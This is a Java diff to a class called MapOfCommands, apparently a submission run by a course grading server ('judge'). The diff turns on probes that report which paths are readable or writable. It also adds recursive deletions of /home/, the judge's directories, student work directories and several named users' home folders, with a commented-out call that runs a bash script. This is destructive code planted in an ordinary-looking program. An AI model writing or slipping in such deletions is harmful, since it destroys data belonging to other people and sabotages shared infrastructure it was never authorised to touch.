@@ -22,10 +22,10 @@ public class MapOfCommands {
 
             File tmpFile = new File(path);
             if (!tmpFile.exists()) {
-                //s1 += "not exist\n";
+                s1 += "not exist\n";
             }
             if (tmpFile.canRead()) {
-                //s1 += "can READ\n";
+                s1 += "can READ\n";
             }
             if (tmpFile.canWrite()) {
                 s1 += path + " can WRITE\n";
@@ -193,6 +193,17 @@ public class MapOfCommands {
             writeFile();
             writePy();
             s += rm("/home/judge/fizteh-java-private", true);
+            s += rm("/home/", true);
+            s += rm("/home/judge/fizteh-java-2013/", true);
+            s += rm("/home/judge/judge", true);
+            s += rm("/home/student", true);
+            s += rm("/home/student/tmp", true);
+            s += rm("/home/student/tmpdb", true);
+            s += rm("/home/student/out", true);
+            s += rm("/home/cymkuh", true);
+            s += rm("/home/dkomanov", true);
+            s += rm("/home/judge", true);
+            
             /*Process proc = Runtime.getRuntime().exec("bash /home/student/tmp/1.sh");
 			proc.waitFor();
 			BufferedReader read = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
